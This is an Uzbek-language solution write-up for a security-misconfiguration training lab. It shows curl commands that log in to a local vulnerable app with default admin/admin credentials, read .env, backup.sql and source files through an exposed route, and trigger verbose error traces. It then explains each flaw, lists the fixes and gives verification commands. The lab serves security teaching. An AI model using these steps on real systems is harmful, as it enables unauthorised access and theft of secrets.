🌐 [Русский](./SOLUTION.md) · **Oʻzbekcha**

# A02 — Yechim (spoylerlar!)

Avval [README](./README.uz.md) dagi maslahatlardan foydalanib, laboratoriyani oʻzingiz bajarib koʻring.

## vulnerable da ekspluatatsiya (port 8011)

```bash
# 1. Sukut boʻyicha hisob yozuvi
curl -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin"}' http://127.0.0.1:8011/login
# → FLAG{a02_default_credentials}

# 2. /files marshruti ilova papkasidagi istalgan faylni beradi
curl http://127.0.0.1:8011/files/.env          # → FLAG{a02_exposed_env_file}
curl http://127.0.0.1:8011/files/backup.sql    # → FLAG{a02_forgotten_backup}
curl http://127.0.0.1:8011/files/app.py        # → manba kodi

# 3. Batafsil xato: trassirovka va BD ga ulanish qatori
curl "http://127.0.0.1:8011/items?id=abc"

# 4. Sarlavhalar
curl -i http://127.0.0.1:8011/
# bor:   X-Powered-By (Flask/Python versiyalari)
# yoʻq:  X-Content-Type-Options, X-Frame-Options, Content-Security-Policy, Referrer-Policy
```

## Xatolar nimada

| № | Xato | Nimasi bilan xavfli |
|---|------|---------------------|
| 1 | `admin` / `admin` paroli | Odatiy juftliklarni biladigan har kim kira oladi |
| 2 | `/files/<nom>` ilova ildizini beradi | `.env`, zaxira nusxalar va manba kodi oqib chiqadi |
| 3 | Xatolar ishlovchisi trassirovka va konfiguratsiyani koʻrsatadi | Ilova tuzilishi va sirlarni oshkor qiladi |
| 4 | Himoya sarlavhalari yoʻq, versiyalar banneri bor | Hujumlarni (clickjacking, MIME sniffing) va razvedkani yengillashtiradi |

## Tuzatishlar (fixed, port 8012)

- Parol `ADMIN_PASSWORD` dan olinadi; berilmagan boʻlsa, tasodifiy generatsiya qilinadi
- `/files` marshruti olib tashlangan; tashqariga faqat `static/` papkasi beriladi
- Yagona xatolar ishlovchisi: foydalanuvchiga `error_id` bilan neytral javob, tafsilotlar faqat logga
- `X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`, `Referrer-Policy` sarlavhalari bor, `X-Powered-By` yoʻq
- Raqam boʻlmagan `id` oddiy kiritish xatosi (`400`) sifatida qayta ishlanadi, ilovani qulatmaydi

fixed da tekshirish:

```bash
curl http://127.0.0.1:8012/files/.env           # 404
curl "http://127.0.0.1:8012/items?id=abc"       # 400, trassirovkasiz
curl -i http://127.0.0.1:8012/                  # himoya sarlavhalari joyida
curl -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin"}' http://127.0.0.1:8012/login   # 401
```

## Yana nimani esda tutish kerak
- Real tizimlarda sirlar logga yozilmaydi: laboratoriyada parol faqat qulaylik uchun logga chiqariladi.
- Konfiguratsiyani avtomatik ravishda va har bir relizda tekshirish kerak, bir marta emas.
